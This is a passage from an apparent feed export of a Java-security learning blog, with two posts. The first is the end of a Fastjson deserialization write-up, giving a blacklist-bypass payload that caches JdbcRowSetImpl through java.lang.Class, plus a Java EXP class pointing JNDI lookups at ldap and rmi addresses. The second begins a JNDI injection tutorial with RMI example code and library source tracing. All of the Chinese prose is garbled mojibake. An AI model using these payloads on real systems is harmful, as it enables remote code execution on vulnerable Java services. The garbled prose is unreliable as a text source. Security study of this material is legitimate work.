<p>é‚£ä¹ˆç°åœ¨å°±æ˜¯çœ‹çœ‹é‚£é‡Œè¿˜æœ‰è°ƒç”¨loadClassæ–¹æ³•ï¼ŒTypeUtils.loadClassæ˜¯æœ‰ä¸‰ä¸ªé‡è½½çš„ï¼Œæœ€åéƒ½æ˜¯ä¼šåˆ°ä¸Šé¢è¿™ä¸ªloadClassæ–¹æ³•çš„ï¼Œæˆ‘ä»¬åœ¨ä¸¤ä¸ªå‚æ•°çš„loadClassæ–¹æ³•ä¸­æ‰¾åˆ°äº†è°ƒç”¨ï¼ˆä¸¤ä¸ªå‚æ•°çš„ï¼Œåˆšå¥½chcheä¸ºtrueï¼Œè™½ç„¶ä¸€ä¸ªå‚æ•°çš„ä¹Ÿæ˜¯ä¼šå…ˆæ¥åˆ°ä¸¤ä¸ªå‚æ•°çš„ï¼Œç„¶ååœ¨å»ä¸‰ä¸ªå‚æ•°çš„æ–¹æ³•ï¼‰</p>
<figure data-type="image" tabindex="38"><img src="https://bloyet.github.io/post-images/1749492822360.png" alt="" loading="lazy"></figure>
<p>åœ¨MiscCodec#deserialzeæ–¹æ³•ä¸­</p>
<p>strValè¿™ä¸ªå‚æ•°å°±æ˜¯æˆ‘ä»¬è¦åŠ è½½çš„ç±»ï¼ˆclassNameï¼‰ï¼Œæˆ‘ä»¬çœ‹æ€ä¹ˆæ§åˆ¶å®ƒçš„å€¼</p>
<figure data-type="image" tabindex="39"><img src="https://bloyet.github.io/post-images/1749492822376.png" alt="" loading="lazy"></figure>
<p>è¦ç»™strValèµ‹å€¼ï¼Œå°±è¦objValä¸ä¸ºç©ºï¼Œå¹¶ä¸”objValçš„å€¼èµ‹ç»™strValï¼Œé‚£ä¹ˆç°åœ¨å°±æ˜¯çœ‹objValæ€ä¹ˆèµ‹å€¼çš„</p>
<figure data-type="image" tabindex="40"><img src="https://bloyet.github.io/post-images/1749492822391.png" alt="" loading="lazy"></figure>
<p>ifåˆ¤æ–­é»˜è®¤æ˜¯trueçš„ï¼ˆæ˜¯å› ä¸ºåœ¨åç»­çš„ parseObject æ–¹æ³•ä¸­ä¼šå°†<code>resolveStatus</code>è®¾ç½®ä¸º<code>TypeNameRedirect</code>ï¼‰ï¼Œç„¶ååˆ¤æ–­jsonå­—ç¬¦ä¸²ä¸­æ˜¯å¦æœ‰valé”®ï¼Œç­‰ç­‰ä¸€ç³»åˆ—è¦æ±‚ï¼Œç„¶åå°±ä¼šæŠŠvalçš„å€¼è§£æè¿”å›ç»™objValä¸­</p>
<figure data-type="image" tabindex="41"><img src="https://bloyet.github.io/post-images/1749492822407.png" alt="" loading="lazy"></figure>
<p>ç„¶åå°±æ˜¯åªè¦æˆ‘ä»¬æŠŠè¿™ä¸ªå†™å…¥è¿›å»ï¼Œæˆ‘ä»¬åœ¨å»æ­£å¸¸åŠ è½½å°±ä¸ä¼šè¢«é»‘åå•åŒ¹é…æ‰äº†ï¼Œçœ‹payloadæ€ä¹ˆå†™ï¼š</p>
<p>é¦–å…ˆæŠŠå®ƒå†™å…¥ç¼“å­˜</p>
<pre><code class="language-java">{
//æ»¡è¶³clazzä¸ºClass.class
&quot;@type&quot;:&quot;java.lang.Class&quot;,
 
//æœ‰valï¼Œä¸”å€¼ä¸ºæˆ‘ä»¬è¦å†™å…¥mappingçš„æ¶æ„ç±»
&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;
}
</code></pre>
<p>ç„¶åå°±æ˜¯æ­£å¸¸çš„ï¼š</p>
<pre><code class="language-java">{    
    &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
    &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:8000/Bloyet&quot;,
    &quot;autoCommit&quot;:&quot;true&quot;
}
</code></pre>
<p>åˆèµ·æ¥ï¼š</p>
<pre><code class="language-java">{
    &quot;1&quot;: {
        &quot;@type&quot;: &quot;java.lang.Class&quot;,
        &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;
    },
    &quot;2&quot;: {
        &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,
        &quot;dataSourceName&quot;: &quot;ldap://127.0.0.1:1099/Bloyet&quot;,
        &quot;autoCommit&quot;: true
    }
}
</code></pre>
<p>EXP:</p>
<pre><code class="language-java">package org.example;

import com.alibaba.fastjson.JSON;

public class EXP_tongsha {
    public static void main(String[] args) {
       Object  EXP = JSON.parseObject(&quot;{\n&quot; +
               &quot;    \&quot;1\&quot;: {\n&quot; +
               &quot;        \&quot;@type\&quot;: \&quot;java.lang.Class\&quot;,\n&quot; +
               &quot;        \&quot;val\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot; +
               &quot;    },\n&quot; +
               &quot;    \&quot;2\&quot;: {\n&quot; +
               &quot;        \&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot; +
               &quot;        \&quot;dataSourceName\&quot;: \&quot;rmi://127.0.0.1:1099/Bloyet\&quot;,\n&quot; +
               &quot;        \&quot;autoCommit\&quot;: true\n&quot; +
               &quot;    }\n&quot; +
               &quot;}&quot;);
    }
}
</code></pre>
<p>å¥½æ–‡ç« ï¼š</p>
<p><a href="https://drops.blbana.cc/2020/04/16/Fastjson%E5%8E%86%E5%8F%B2%E8%A1%A5%E4%B8%81Bypass%E5%88%86%E6%9E%90/#%E7%BB%95%E8%BF%87%E5%8E%9F%E5%9B%A0-2">Fastjsonå†å²è¡¥ä¸Bypassåˆ†æ Â· BlBanaâ€™s BlackHouse</a></p>
<p>[Fastjson ååºåˆ—åŒ–æ¼æ´ Â· æ”»å‡»Java Webåº”ç”¨-<a href="https://www.javasec.org/java-vuls/FastJson.html">Java Webå®‰å…¨]</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[JNDIæ³¨å…¥]]></title>
        <id>https://bloyet.github.io/post/jndi-zhu-ru/</id>
        <link href="https://bloyet.github.io/post/jndi-zhu-ru/">
        </link>
        <updated>2025-06-09T17:56:24.000Z</updated>
        <content type="html"><![CDATA[<p>å‚è€ƒæ–‡çŒ®ï¼š</p>
<p><a href="https://goodapple.top/archives/696">Javaå®‰å…¨å­¦ä¹ â€”â€”JNDIæ³¨å…¥ - æ«ã®Blog</a></p>
<p><a href="https://stoocea.github.io/post/JNDIRe0.html#%E4%BB%80%E4%B9%88%E6%98%AF-JNDI">JNDIé‡çœ‹ | stooceaâ€™s blog</a></p>
<h1 id="jndiç®€è¿°">JNDIç®€è¿°</h1>
<p>JNDIï¼ˆJava Naming and Directory Interfaceï¼ŒJavaå‘½åå’Œç›®å½•æ¥å£ï¼‰æ˜¯SUNå…¬å¸æä¾›çš„ä¸€ç§æ ‡å‡†çš„Javaå‘½åç³»ç»Ÿæ¥å£ã€‚JNDIæä¾›ç»Ÿä¸€çš„å®¢æˆ·ç«¯APIï¼Œå¹¶ç”±ç®¡ç†è€…å°†JNDI APIæ˜ å°„ä¸ºç‰¹å®šçš„<strong>å‘½åæœåŠ¡</strong>å’Œ<strong>ç›®å½•æœåŠ¡</strong>ï¼Œä¸ºå¼€å‘äººå‘˜æŸ¥æ‰¾å’Œè®¿é—®å„ç§èµ„æºæä¾›äº†ç»Ÿä¸€çš„é€šç”¨æ¥å£ï¼Œå¯ä»¥ç”¨æ¥å®šä¹‰ç”¨æˆ·ã€ç½‘ç»œã€æœºå™¨ã€å¯¹è±¡å’ŒæœåŠ¡ç­‰å„ç§èµ„æºã€‚ç®€å•æ¥è¯´ï¼Œå¼€å‘äººå‘˜é€šè¿‡åˆç†çš„ä½¿ç”¨JNDIï¼Œèƒ½å¤Ÿè®©ç”¨æˆ·é€šè¿‡ç»Ÿä¸€çš„æ–¹å¼è®¿é—®è·å–ç½‘ç»œä¸Šçš„å„ç§èµ„æºå’ŒæœåŠ¡</p>
<h2 id="å‘½åæœåŠ¡naming-server">å‘½åæœåŠ¡ï¼ˆNaming Serverï¼‰</h2>
<p>å‘½åæœåŠ¡ï¼Œç®€å•æ¥è¯´ï¼Œå°±æ˜¯ä¸€ç§é€šè¿‡åç§°æ¥æŸ¥æ‰¾å®é™…å¯¹è±¡çš„æœåŠ¡ã€‚æ¯”å¦‚æˆ‘ä»¬çš„RMIåè®®ï¼Œå¯ä»¥é€šè¿‡åç§°æ¥æŸ¥æ‰¾å¹¶è°ƒç”¨å…·ä½“çš„è¿œç¨‹å¯¹è±¡ã€‚å†æ¯”å¦‚æˆ‘ä»¬çš„DNSåè®®ï¼Œé€šè¿‡åŸŸåæ¥æŸ¥æ‰¾å…·ä½“çš„IPåœ°å€ã€‚è¿™äº›éƒ½å¯ä»¥å«åšå‘½åæœåŠ¡ã€‚</p>
<p>åœ¨å‘½åæœåŠ¡ä¸­ï¼Œæœ‰å‡ ä¸ªé‡è¦çš„æ¦‚å¿µã€‚</p>
<ul>
<li><strong>Bindings</strong>ï¼šè¡¨ç¤ºä¸€ä¸ªåç§°å’Œå¯¹åº”å¯¹è±¡çš„ç»‘å®šå…³ç³»ï¼Œæ¯”å¦‚åœ¨åœ¨ DNS ä¸­åŸŸåç»‘å®šåˆ°å¯¹åº”çš„ IPï¼Œåœ¨RMIä¸­è¿œç¨‹å¯¹è±¡ç»‘å®šåˆ°å¯¹åº”çš„name,æ–‡ä»¶ç³»ç»Ÿä¸­æ–‡ä»¶åç»‘å®šåˆ°å¯¹åº”çš„æ–‡ä»¶ã€‚</li>
<li><strong>Context</strong>ï¼šä¸Šä¸‹æ–‡ï¼Œä¸€ä¸ªä¸Šä¸‹æ–‡ä¸­å¯¹åº”ç€<strong>ä¸€ç»„åç§°åˆ°å¯¹è±¡çš„ç»‘å®šå…³ç³»</strong>ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æŒ‡å®šä¸Šä¸‹æ–‡ä¸­æŸ¥æ‰¾åç§°å¯¹åº”çš„å¯¹è±¡ã€‚æ¯”å¦‚åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œä¸€ä¸ªç›®å½•å°±æ˜¯ä¸€ä¸ªä¸Šä¸‹æ–‡ï¼Œå¯ä»¥åœ¨è¯¥ç›®å½•ä¸­æŸ¥æ‰¾æ–‡ä»¶ï¼Œå…¶ä¸­å­ç›®å½•ä¹Ÿå¯ä»¥ç§°ä¸ºå­ä¸Šä¸‹æ–‡ (SubContext)ã€‚</li>
<li><strong>References</strong>ï¼šåœ¨ä¸€ä¸ªå®é™…çš„åç§°æœåŠ¡ä¸­ï¼Œæœ‰äº›å¯¹è±¡å¯èƒ½æ— æ³•ç›´æ¥å­˜å‚¨åœ¨ç³»ç»Ÿå†…ï¼Œè¿™æ—¶å®ƒä»¬ä¾¿ä»¥å¼•ç”¨çš„å½¢å¼è¿›è¡Œå­˜å‚¨ï¼Œå¯ä»¥ç†è§£ä¸º C/C++ ä¸­çš„æŒ‡é’ˆã€‚å¼•ç”¨ä¸­åŒ…å«äº†è·å–å®é™…å¯¹è±¡æ‰€éœ€çš„ä¿¡æ¯ï¼Œç”šè‡³å¯¹è±¡çš„å®é™…çŠ¶æ€ã€‚æ¯”å¦‚æ–‡ä»¶ç³»ç»Ÿä¸­å®é™…æ ¹æ®åç§°æ‰“å¼€çš„æ–‡ä»¶æ˜¯ä¸€ä¸ªæ•´æ•° fd (file descriptor)ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªå¼•ç”¨ï¼Œå†…æ ¸æ ¹æ®è¿™ä¸ªå¼•ç”¨å€¼å»æ‰¾åˆ°ç£ç›˜ä¸­çš„å¯¹åº”ä½ç½®å’Œè¯»å†™åç§»ã€‚</li>
</ul>
<h2 id="ç›®å½•æœåŠ¡directory-service">ç›®å½•æœåŠ¡ï¼ˆDirectory Serviceï¼‰</h2>
<p>ç®€å•æ¥è¯´ï¼Œç›®å½•æœåŠ¡æ˜¯å‘½åæœåŠ¡çš„æ‰©å±•ï¼Œé™¤äº†åç§°æœåŠ¡ä¸­å·²æœ‰çš„åç§°åˆ°å¯¹è±¡çš„å…³è”ä¿¡æ¯å¤–ï¼Œè¿˜å…è®¸å¯¹è±¡æ‹¥æœ‰å±æ€§ï¼ˆAttributesï¼‰ä¿¡æ¯ã€‚ç”±æ­¤ï¼Œæˆ‘ä»¬ä¸ä»…å¯ä»¥æ ¹æ®åç§°å»æŸ¥æ‰¾ï¼ˆLookupï¼‰å¯¹è±¡(å¹¶è·å–å…¶å¯¹åº”å±æ€§)ï¼Œè¿˜å¯ä»¥æ ¹æ®å±æ€§å€¼å»æœç´¢ï¼ˆSearchï¼‰å¯¹è±¡ã€‚</p>
<p>ä¸€äº›å¸¸è§çš„ç›®å½•æœåŠ¡æœ‰ï¼š</p>
<ul>
<li>LDAPï¼š è½»å‹ç›®å½•è®¿é—®åè®®</li>
<li>Active Directory: ä¸º Windows åŸŸç½‘ç»œè®¾è®¡ï¼ŒåŒ…å«å¤šä¸ªç›®å½•æœåŠ¡ï¼Œæ¯”å¦‚åŸŸåæœåŠ¡ã€è¯ä¹¦æœåŠ¡ç­‰ï¼›</li>
<li>å…¶ä»–åŸºäº X.500 (ç›®å½•æœåŠ¡çš„æ ‡å‡†) å®ç°çš„ç›®å½•æœåŠ¡ï¼›</li>
</ul>
<h2 id="jndi-spi">JNDI SPI</h2>
<p>JNDI æ¶æ„ä¸Šä¸»è¦åŒ…å«ä¸¤ä¸ªéƒ¨åˆ†ï¼Œå³ Java çš„åº”ç”¨å±‚æ¥å£å’Œ SPIï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º</p>
<figure data-type="image" tabindex="1"><img src="https://bloyet.github.io/post-images/1749492628850.png" alt="" loading="lazy"></figure>
<p>SPIï¼ˆService Provider Interfaceï¼‰ï¼Œå³æœåŠ¡ä¾›åº”æ¥å£ï¼Œä¸»è¦ä½œç”¨æ˜¯ä¸ºåº•å±‚çš„å…·ä½“ç›®å½•æœåŠ¡æä¾›ç»Ÿä¸€æ¥å£ï¼Œä»è€Œå®ç°ç›®å½•æœåŠ¡çš„å¯æ’æ‹”å¼å®‰è£…ã€‚</p>
<p>JDK ä¸­åŒ…å«äº†ä¸‹è¿°å†…ç½®çš„å‘½åç›®å½•æœåŠ¡:</p>
<ul>
<li>RMI: Java Remote Method Invocationï¼ŒJava è¿œç¨‹æ–¹æ³•è°ƒç”¨</li>
<li>LDAP: è½»é‡çº§ç›®å½•è®¿é—®åè®®</li>
<li>CORBA: Common Object Request Broker Architectureï¼Œé€šç”¨å¯¹è±¡è¯·æ±‚ä»£ç†æ¶æ„ï¼Œç”¨äº COS åç§°æœåŠ¡(Common Object Services)</li>
<li>DNSï¼ˆåŸŸåè½¬æ¢åè®®ï¼‰</li>
</ul>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œç”¨æˆ·è¿˜å¯ä»¥åœ¨ Java å®˜ç½‘ä¸‹è½½å…¶ä»–ç›®å½•æœåŠ¡å®ç°ã€‚ç”±äº SPI çš„ç»Ÿä¸€æ¥å£ï¼Œå‚å•†ä¹Ÿå¯ä»¥æä¾›è‡ªå·±çš„ç§æœ‰ç›®å½•æœåŠ¡å®ç°ï¼Œç”¨æˆ·æ— éœ€é‡å¤ä¿®æ”¹ä»£ç ã€‚</p>
<h1 id="jndiä»£ç ç¤ºä¾‹">JNDIä»£ç ç¤ºä¾‹</h1>
<p>JNDI æ¥å£ä¸»è¦åˆ†ä¸ºä¸‹è¿° 5 ä¸ªåŒ…:</p>
<ul>
<li><code>javax.naming</code>ï¼šä¸»è¦ç”¨äºå‘½åæ“ä½œï¼Œå®ƒåŒ…å«äº†å‘½åæœåŠ¡çš„ç±»å’Œæ¥å£ï¼Œè¯¥åŒ…å®šä¹‰äº†Contextæ¥å£å’ŒInitialContextç±»</li>
<li><code>javax.naming.directory</code>ï¼šä¸»è¦ç”¨äºç›®å½•æ“ä½œï¼Œå®ƒå®šä¹‰äº†DirContextæ¥å£å’ŒInitialDir-Contextç±»</li>
<li><code>javax.naming.event</code>ï¼šåœ¨å‘½åç›®å½•æœåŠ¡å™¨ä¸­è¯·æ±‚äº‹ä»¶é€šçŸ¥</li>
<li><code>javax.naming.ldap</code>ï¼šæä¾›LDAPæœåŠ¡æ”¯æŒ</li>
<li><code>javax.naming.spi</code>ï¼šå…è®¸åŠ¨æ€æ’å…¥ä¸åŒå®ç°ï¼Œä¸ºä¸åŒå‘½åç›®å½•æœåŠ¡ä¾›åº”å•†çš„å¼€å‘äººå‘˜æä¾›å¼€å‘å’Œå®ç°çš„é€”å¾„ï¼Œä»¥ä¾¿åº”ç”¨ç¨‹åºé€šè¿‡JNDIå¯ä»¥è®¿é—®ç›¸å…³æœåŠ¡</li>
</ul>
<p>ä¸‹é¢æˆ‘ä»¬é€šè¿‡å…·ä½“ä»£ç æ¥çœ‹çœ‹JNDIæ˜¯å¦‚ä½•å®ç°ä¸å„æœåŠ¡è¿›è¡Œäº¤äº’çš„ã€‚</p>
<h2 id="jndirmi">JNDI+RMI</h2>
<h3 id="rmiæ¥å£">RMIæ¥å£ï¼š</h3>
<pre><code class="language-java">package org.example;

import java.rmi.Remote;
import java.rmi.RemoteException;

public interface Remoteobj extends Remote {
    public String sayHello(String kaywords) throws RemoteException;
    
}
</code></pre>
<h3 id="rmiè¿œç¨‹å¯¹è±¡å®ç°ç±»">RMIè¿œç¨‹å¯¹è±¡ï¼ˆå®ç°ç±»ï¼‰</h3>
<pre><code class="language-java">package org.example;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class RemoteobjImpl extends UnicastRemoteObject implements Remoteobj {
    protected RemoteobjImpl() throws RemoteException {
    }

    @Override
    public String sayHello(String keywords) throws RemoteException {
        String upkeywords = keywords.toUpperCase();
        System.out.println(upkeywords);
        return upkeywords;
    }

   
}
</code></pre>
<h3 id="rmiæœåŠ¡ç«¯">RMIæœåŠ¡ç«¯ï¼š</h3>
<pre><code class="language-java">package org.example;
import java.rmi.Naming;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.server.UnicastRemoteObject;

public class RMIServer {
    public static void main(String[] args) throws RemoteException, AlreadyBoundException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, MalformedURLException {


        Registry registry = LocateRegistry.createRegistry(1099);
        Remoteobj remoteobj = new RemoteobjImpl();
       
        Naming.bind(&quot;Bloyet&quot;, remoteobj);
    }
</code></pre>
<h3 id="å®¢æˆ·ç«¯">å®¢æˆ·ç«¯ï¼š</h3>
<pre><code class="language-java">package org.example;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.rmi.RemoteException;


public class JNDI {
    public static void main(String[] args) throws NamingException, RemoteException {
       Hashtable&lt;String, String&gt; env = new Hashtable&lt;&gt;();
        env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);
        env.put(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;);
        
        //åˆå§‹åŒ–ä¸Šä¸‹æ–‡
        Context initialContext = new InitialContext(env);
 
        //è°ƒç”¨è¿œç¨‹ç±»
        Remoteobj remoteobj = (Remoteobj) context.lookup(&quot;Bloyet&quot;);
        remoteobj.sayHello(&quot;Hello World&quot;);

    }
}
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://bloyet.github.io/post-images/1749492628865.png" alt="" loading="lazy"></figure>
<h2 id="jndi-dns">JNDI + DNS</h2>
<p>æˆ‘ä»¬é€šè¿‡JNDIæˆåŠŸåœ°è°ƒç”¨äº†RMIå’ŒDNSæœåŠ¡ã€‚é‚£ä¹ˆå¯¹äºJNDIæ¥è®²ï¼Œå®ƒæ˜¯å¦‚ä½•è¯†åˆ«æˆ‘ä»¬è°ƒç”¨çš„æ˜¯ä½•ç§æœåŠ¡å‘¢ï¼Ÿè¿™å°±ä¾èµ–äºæˆ‘ä»¬ä¸Šé¢æåˆ°çš„Contextï¼ˆä¸Šä¸‹æ–‡ï¼‰äº†ã€‚</p>
<h1 id="jndiçš„å·¥ä½œæµç¨‹">JNDIçš„å·¥ä½œæµç¨‹</h1>
<p>æˆ‘ä»¬å°±æ‹¿æˆ‘ä»¬ç†Ÿæ‚‰ä¸€ç‚¹çš„RMIä¸¾ä¾‹ï¼š</p>
<pre><code class="language-java">        //è®¾ç½®JNDIç¯å¢ƒå˜é‡
        Hashtable&lt;String, String&gt; env = new Hashtable&lt;&gt;();
        env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);
        env.put(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;);
        
        //åˆå§‹åŒ–ä¸Šä¸‹æ–‡
        Context initialContext = new InitialContext(env);
</code></pre>
<p>é¦–å…ˆä½¿ç”¨<code>Hashtable</code>ç±»æ¥è®¾ç½®å±æ€§<code>*INITIAL_CONTEXT_FACTORY*</code>å’Œ<code>*PROVIDER_URL*</code>çš„å€¼ã€‚å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œæˆ‘ä»¬å°†<code>*INITIAL_CONTEXT_FACTORY*</code>è®¾ç½®ä¸ºäº†<code>&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</code>ï¼ŒJNDIæ­£æ˜¯é€šè¿‡è¿™ä¸€å±æ€§æ¥åˆ¤æ–­æˆ‘ä»¬å°†è¦è°ƒç”¨ä½•ç§æœåŠ¡ã€‚</p>
<p>æ¥ç€æˆ‘ä»¬å°†å±æ€§<code>PROVIDER_URL</code>è®¾ç½®ä¸ºäº†<code>&quot;rmi://localhost:1099&quot;</code>ï¼Œè¿™æ­£æ˜¯æˆ‘ä»¬RMIæœåŠ¡çš„åœ°å€ã€‚JNDIé€šè¿‡è¯¥å±æ€§æ¥è·å–æœåŠ¡çš„è·¯å¾„ï¼Œè¿›è€Œè°ƒç”¨è¯¥æœåŠ¡ã€‚</p>
<p>æœ€åå‘<code>InitialContext</code>ç±»ä¼ å…¥æˆ‘ä»¬è®¾ç½®çš„å±æ€§å€¼æ¥åˆå§‹åŒ–ä¸€ä¸ª<code>Context</code>ï¼Œäºæ˜¯æˆ‘ä»¬å°±è·å¾—äº†ä¸€ä¸ªä¸RMIæœåŠ¡ç›¸å…³è”çš„ä¸Šä¸‹æ–‡<code>Context</code>ã€‚</p>
<p>å½“ç„¶ ä¸RMIä¸€æ ·ï¼ŒContextåŒæ ·é€šè¿‡ä»¥ä¸‹äº”ç§æ–¹æ³•æ¥ä¸è¢«è°ƒç”¨çš„æœåŠ¡è¿›è¡Œäº¤äº’</p>
<pre><code class="language-java">//å°†åç§°ç»‘å®šåˆ°å¯¹è±¡
bind(Name name, Object obj)
 
//æšä¸¾åœ¨å‘½åä¸Šä¸‹æ–‡ä¸­ç»‘å®šçš„åç§°ä»¥åŠç»‘å®šåˆ°å®ƒä»¬çš„å¯¹è±¡çš„ç±»å
list(String name) 
 
//æ£€ç´¢å‘½åå¯¹è±¡
lookup(String name)
 
//å°†åç§°é‡ç»‘å®šåˆ°å¯¹è±¡ 
rebind(String name, Object obj) 
 
//å–æ¶ˆç»‘å®šå‘½åå¯¹è±¡
unbind(String name) 
</code></pre>
<h1 id="jndiåº•å±‚ä»£ç å®ç°">JNDIåº•å±‚ä»£ç å®ç°</h1>
<h2 id="è·å–å·¥å‚ç±»">è·å–å·¥å‚ç±»</h2>
<p>æ–­ç‚¹æ‰“åœ¨è¿™é‡Œ</p>
<figure data-type="image" tabindex="3"><img src="https://bloyet.github.io/post-images/1749492628881.png" alt="" loading="lazy"></figure>
<p>è¿›å…¥æ„é€ å‡½æ•°ï¼Œè°ƒç”¨initå‡½æ•°</p>
<figure data-type="image" tabindex="4"><img src="https://bloyet.github.io/post-images/1749492628896.png" alt="" loading="lazy"></figure>
<p>è·å–ç¯å¢ƒå˜é‡ï¼Œä»¥åŠåˆšåˆšæˆ‘ä»¬åœ¨hashtableä¸­è®¾ç½®çš„ç¯å¢ƒå˜é‡ï¼Œç„¶åç»§ç»­è°ƒç”¨getDefaultInitCtx()æ–¹æ³•</p>
<figure data-type="image" tabindex="5"><img src="https://bloyet.github.io/post-images/1749492628927.png" alt="" loading="lazy"></figure>
<p>è°ƒç”¨NamingManager çš„ <code>getInitialContext</code>æ–¹æ³•ï¼Œè·Ÿè¿›</p>
<figure data-type="image" tabindex="6"><img src="https://bloyet.github.io/post-images/1749492628943.png" alt="" loading="lazy"></figure>
<pre><code class="language-java">public static Context getInitialContext(Hashtable&lt;?,?&gt; env)
    throws NamingException {
    InitialContextFactory factory;

    InitialContextFactoryBuilder builder = getInitialContextFactoryBuilder();
    if (builder == null) {
        // No factory installed, use property
        // Get initial context factory class name

        String className = env != null ?
            (String)env.get(Context.INITIAL_CONTEXT_FACTORY) : null;
        if (className == null) {
            NoInitialContextException ne = new NoInitialContextException(
                &quot;Need to specify class name in environment or system &quot; +
                &quot;property, or as an applet parameter, or in an &quot; +
                &quot;application resource file:  &quot; +
                Context.INITIAL_CONTEXT_FACTORY);
            throw ne;
        }

        try {
            factory = (InitialContextFactory)
                helper.loadClass(className).newInstance();
        } catch(Exception e) {
            NoInitialContextException ne =
                new NoInitialContextException(
                    &quot;Cannot instantiate class: &quot; + className);
            ne.setRootCause(e);
            throw ne;
        }
    } else {
        factory = builder.createInitialContextFactory(env);
    }

    return factory.getInitialContext(env);
}
</code></pre>
<p>è¿™é‡Œé¦–å…ˆé€šè¿‡<code>getInitialContextFactoryBuilder()</code>åˆå§‹åŒ–äº†ä¸€ä¸ª<code>InitialContextFactoryBuilder</code>ç±»ã€‚å¦‚æœè¯¥ç±»ä¸ºç©ºï¼Œåˆ™å°†<code>className</code>è®¾ç½®ä¸º<code>*INITIAL_CONTEXT_FACTORY*</code>å±æ€§ã€‚è¿˜è®°å¾—è¯¥å±æ€§æ˜¯ä»€ä¹ˆå—ï¼Ÿå°±æ˜¯æˆ‘ä»¬æ‰‹åŠ¨è®¾ç½®çš„RMIä¸Šä¸‹æ–‡å·¥å‚ç±»<code>com.sun.jndi.rmi.registry.RegistryContextFactory</code>       è¿™é‡Œå‘ç°å°±æ˜¯åˆ¤æ–­ä¸ºç©ºäº†ï¼Œè¿›å…¥ifè¯­å¥  å¯¹classnameè¿›è¡Œèµ‹å€¼</p>
<figure data-type="image" tabindex="7"><img src="https://bloyet.github.io/post-images/1749492628959.png" alt="" loading="lazy"></figure>
<p>æ¥ç€å¾€ä¸‹çœ‹</p>
<p>è¿™é‡Œé€šè¿‡<code>loadClass()</code>æ¥åŠ¨æ€åŠ è½½æˆ‘ä»¬è®¾ç½®çš„å·¥å‚ç±»ã€‚æœ€ç»ˆè°ƒç”¨çš„å…¶å®æ˜¯<code>RegistryContextFactory#getInitialContext()</code>æ–¹æ³•ï¼Œé€šè¿‡æˆ‘ä»¬çš„è®¾ç½®å·¥å‚ç±»æ¥åˆå§‹åŒ–ä¸Šä¸‹æ–‡Context</p>
<figure data-type="image" tabindex="8"><img src="https://bloyet.github.io/post-images/1749492628974.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="9"><img src="https://bloyet.github.io/post-images/1749492628990.png" alt="" loading="lazy"></figure>
<h2 id="è·å–æœåŠ¡äº¤äº’æ‰€éœ€èµ„æº">è·å–æœåŠ¡äº¤äº’æ‰€éœ€èµ„æº</h2>
<p>ç°åœ¨JNDIçŸ¥é“äº†æˆ‘ä»¬æƒ³è¦è°ƒç”¨ä½•ç§æœåŠ¡ï¼Œé‚£ä¹ˆå®ƒåˆæ˜¯å¦‚ä½•çŸ¥é“æœåŠ¡åœ°å€ä»¥åŠè·å–æœåŠ¡çš„å„ç§èµ„æºçš„å‘¢ï¼Ÿ è¿˜æ˜¯åœ¨åˆšåˆšé‚£é‡Œï¼Œæˆ‘ä»¬æ¥ç€çœ‹</p>
<pre><code class="language-java">RegistryContextFactory#getInitialContext()
public Context getInitialContext(Hashtable&lt;?, ?&gt; var1) throws NamingException {
    if (var1 != null) {
        var1 = (Hashtable)var1.clone();
    }

    return URLToContext(getInitCtxURL(var1), var1);
}
</code></pre>
<p>var1 å°±æ˜¯æˆ‘ä»¬è®¾ç½®çš„ç¯å¢ƒ ï¼Œå…ˆè·Ÿè¿›getInitCtxURL</p>
<p>JNDIé€šè¿‡æˆ‘ä»¬è®¾ç½®çš„<code>*PROVIDER_URL*</code>ç¯å¢ƒå˜é‡æ¥è·å–æœåŠ¡çš„è·¯å¾„</p>
<figure data-type="image" tabindex="10"><img src="https://bloyet.github.io/post-images/1749492629006.png" alt="" loading="lazy"></figure>
<p>ç»§ç»­çœ‹ URLToContext</p>
<p>åˆå§‹åŒ–äº†ä¸€ä¸ªnew rmiURLContextFactory(); ç„¶åè°ƒç”¨äº†rmiURLContextFactory#getObjectInstanceæ–¹æ³•ï¼Œè·Ÿè¿›</p>
<pre><code class="language-java">private static Context URLToContext(String var0, Hashtable&lt;?, ?&gt; var1) throws NamingException {
    rmiURLContextFactory var2 = new rmiURLContextFactory();
    Object var3 = var2.getObjectInstance(var0, (Name)null, (Context)null, var1);
    if (var3 instanceof Context) {
        return (Context)var3;
    } else {
        throw new NotContextException(var0);
    }
}
</code></pre>
<p>var1 ä¸ä¸ºç©º  è¿›å…¥ç¬¬äºŒä¸ªif è°ƒç”¨getUsingURL æ–¹æ³•ï¼Œè·Ÿè¿›</p>
<figure data-type="image" tabindex="11"><img src="https://bloyet.github.io/post-images/1749492629022.png" alt="" loading="lazy"></figure>
<p>å‘ç°è°ƒç”¨äº†lookupæ–¹æ³•ï¼Œé‚£å°±è·Ÿè¿›çœ‹çœ‹</p>
<figure data-type="image" tabindex="12"><img src="https://bloyet.github.io/post-images/1749492629037.png" alt="" loading="lazy"></figure>
